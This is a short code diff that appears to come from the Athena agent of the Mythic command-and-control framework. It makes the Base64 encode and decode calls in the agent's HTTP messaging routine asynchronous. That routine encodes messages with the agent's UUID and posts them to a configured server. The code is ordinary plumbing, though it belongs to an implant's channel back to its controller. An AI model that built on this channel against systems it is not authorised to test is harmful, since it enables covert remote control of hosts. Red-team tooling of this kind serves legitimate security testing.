@@ -123,7 +123,7 @@ namespace Athena.Config
                 }
                 else
                 {
-                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
 
                 var response = await this.client.PostAsync(Globals.mc.MythicConfig.currentConfig.postURL, new StringContent(json));
@@ -135,7 +135,7 @@ namespace Athena.Config
                 }
                 else
                 {
-                    msg = Misc.Base64Decode(msg).Substring(36);
+                    msg = (await Misc.Base64Decode(msg)).Substring(36);
                 }
                 return msg;
             }
